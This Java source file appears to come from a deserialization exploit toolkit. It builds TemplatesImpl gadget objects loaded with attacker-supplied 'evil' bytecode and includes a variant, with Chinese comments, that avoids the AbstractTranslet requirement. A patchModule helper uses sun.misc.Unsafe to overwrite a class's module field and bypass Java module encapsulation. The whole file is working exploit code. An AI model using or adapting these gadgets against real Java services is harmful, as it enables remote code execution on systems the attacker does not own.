package exp.tools;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import sun.misc.Unsafe;

import javax.xml.transform.Templates;
import java.io.IOException;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Random;

public class TemplatesGen {
    public static void main(String[] args) {

    }

    // 恶意类需要继承AbstractTranslet
    public static Templates getTemplates1(byte[] byteCode, String bytePath) throws Exception {
        byte[] evilBytes;
        if (byteCode != null) {
            evilBytes = byteCode;
        }else {
            evilBytes = Files.readAllBytes(Paths.get(bytePath));
        }
        TemplatesImpl templates = new TemplatesImpl();
        ReflectTools.setFieldValue(templates, "_name", "1diot9");
        ReflectTools.setFieldValue(templates, "_class", null);
        ReflectTools.setFieldValue(templates, "_bytecodes", new byte[][]{evilBytes});
        return templates;
    }

    public static Templates getTemplates2(byte[] byteCode, String bytePath) throws Exception {
        byte[] evilBytes;
        if (byteCode != null) {
            evilBytes = byteCode;
        }else {
            evilBytes = Files.readAllBytes(Paths.get(bytePath));
        }
        TemplatesImpl templates = new TemplatesImpl();
        ClassPool pool = ClassPool.getDefault();
        long l = System.currentTimeMillis();
        CtClass ctClass = pool.makeClass("useless" + l);
        byte[] useless = ctClass.toBytecode();
        ReflectTools.setFieldValue(templates, "_name", "1diot9");
        ReflectTools.setFieldValue(templates, "_class", null);
//        ReflectTools.setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        ReflectTools.setFieldValue(templates, "_transletIndex", 0);
        // 修改bytecodes数量和transletIndex，这样就不用继承AbstractTranslet
        ReflectTools.setFieldValue(templates, "_bytecodes", new byte[][]{evilBytes, useless});
        return templates;
    }

    public static void patchModule(Class current, Class target) throws Exception {
        Field field = Unsafe.class.getDeclaredField("theUnsafe");
        field.setAccessible(true);
        Unsafe unsafe = (Unsafe) field.get(null);

        // 所有Class的数据结构都是一样的，相同字段的偏移量也是一样的
        long l = unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
        Module targetModule = target.getModule();
        unsafe.putObject(current, l, targetModule);
    }

}
